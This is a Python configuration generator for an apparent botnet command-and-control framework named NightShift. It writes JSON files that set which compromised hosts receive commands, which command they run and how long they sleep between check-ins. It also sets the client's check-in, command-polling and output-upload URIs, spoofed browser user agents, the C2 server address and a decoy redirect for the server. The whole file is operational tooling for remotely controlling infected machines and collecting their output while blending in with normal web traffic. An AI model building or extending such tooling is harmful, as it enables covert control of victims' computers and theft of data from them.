#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import sys


def fof_conf():

    try:
        while True:
            ns_cmd_path = "ns_fof_cmd.json"
            host_404_w = str(input('Enter Host Hash or ALL (default ALL): ') or 'ALL')
            host_os_404_w = str(input('Enter Host OS - currently available (nt/posix) (default nt): ') or 'nt')
            host_cmd_404_w = str(input('Enter Command to be run on host - (default None): ') or 'None')
            host_slpstate_404_w = str(input('Enter 404 Client Sleep State in minutes - (default 30 - there is also an option for a random host time from 1-120 minut by entering 0): ') or '30')
            ns_cmd_config_w = { "host_404": host_404_w, "host_os_404": host_os_404_w, "host_cmd_404": host_cmd_404_w, "host_slpstate_404": int(host_slpstate_404_w) }
            with open(ns_cmd_path, 'w') as ns_cmd_w:
                json.dump(ns_cmd_config_w, ns_cmd_w)
            ns_cmd_w.close()
            ns_exit_cmd = str(input('Do you want to exit (Y/N) default - N: ') or 'N')
            if ns_exit_cmd == 'N':
                continue
            else:
                print('Exiting NighShit Command')
                break
    except KeyboardInterrupt:
        print('\nInterrupted - NightShift Command exited due to a keyboard interrupt.')

def cs_conf():

    try:
        while True:
            ns_c_config_path = "ns_c_config.json"
            ns_s_config_path = "ns_s_config.json"
            ns_cs_init_uri = str(input('Enter initial communication test URI - (default=/init/comms): ') or '/init/comms')
            ns_cs_init_uri_p = str(input('Enter initial client data post URI - (default=/init/comms/post): ') or '/init/comms/post')
            ns_cs_fof_uri = str(input('Enter 404 command communication URI - (default=/fof/commands): ') or '/fof/commands')
            ns_cs_data_uri_p = str(input('Enter command data output post URI - (default=/command/output): ') or '/command/output')
            ns_cs_get_ua = str(input('Enter a user agent string to be used for get methods - (default=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Edg/88.0.705.68): ') or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Edg/88.0.705.68')
            ns_cs_post_ua = str(input('Enter a user agent string to be used for post methods - (default=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Edg/88.0.705.68): ') or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Edg/88.0.705.68')
            ns_cs_listen_port = str(input('Enter port nightshift server will listen on - (default=80): ') or '80')
            ns_s_url_redirect = str(input('Enter false redirect URLs - Server Only - (default=https://en.wikipedia.org/wiki/Botnet#Command_and_control): ') or 'https://en.wikipedia.org/wiki/Botnet#Command_and_control')
            ns_c_fqdn_ip = str(input('Enter the FQDN, IP, or DGA - Client Only - (default=DGA - currently unavailable so please enter FQDN or IP)\nexample FQDN - www.example.com\nexample IP - 1.1.1.1: '))
            ns_init_site_complt = 'http://' + ns_c_fqdn_ip + ':' + ns_cs_listen_port + ns_cs_init_uri
            ns_initp_site_complt = 'http://' + ns_c_fqdn_ip + ':' +ns_cs_listen_port + ns_cs_init_uri_p
            ns_fof_site_complt = 'http://' + ns_c_fqdn_ip + ':' + ns_cs_listen_port + ns_cs_fof_uri
            ns_datap_site_complt = 'http://' + ns_c_fqdn_ip + ':' + ns_cs_listen_port + ns_cs_data_uri_p
            ns_c_config_w = { "ns_init_site": ns_init_site_complt, "ns_init_site_p": ns_initp_site_complt, "ns_fof_site": ns_fof_site_complt, "ns_post_site": ns_datap_site_complt, "ns_get_ua": ns_cs_get_ua, "ns_post_ua": ns_cs_post_ua }
            ns_s_config_w = { "ns_init_suri": ns_cs_init_uri, "ns_init_surip": ns_cs_init_uri_p, "ns_fof_suri": ns_cs_fof_uri, "ns_post_suri": ns_cs_data_uri_p, "ns_get_ua": ns_cs_get_ua, "ns_post_ua": ns_cs_post_ua, "ns_aiohttp_lp": int(ns_cs_listen_port), "ns_redirect_url": ns_s_url_redirect }
            with open(ns_c_config_path, 'w') as ns_cconfig_w:
                json.dump(ns_c_config_w, ns_cconfig_w)
            ns_cconfig_w.close()
            with open(ns_s_config_path, 'w') as ns_sconfig_w:
                json.dump(ns_s_config_w, ns_sconfig_w)
            ns_sconfig_w.close()
            ns_exit_cmd = str(input('Do you want to exit (Y/N) default - N: ') or 'N')
            if ns_exit_cmd == 'N':
                continue
            else:
                print('Exiting NighShit Command')
                break
    except KeyboardInterrupt:
        print('\nInterrupted - NightShift Command exited due to a keyboard interrupt.')

if __name__ == "__main__":
    if (len(sys.argv) > 1 and (sys.argv[1] == '--cmd' or sys.argv[1] == '--conf')):
        if (sys.argv[1] == '--cmd'):
            fof_conf()
        elif  (sys.argv[1] == '--conf'):
            cs_conf()
        sys.exit(0)
    else:
        print('Usage:\npython3 nightshift_cmd_conf.py cmd (to generate the fof c2 command)\npython3 nightshift_cmd_conf.py  conf (to generate a client/server configuration file)\n')
        sys.exit(1)
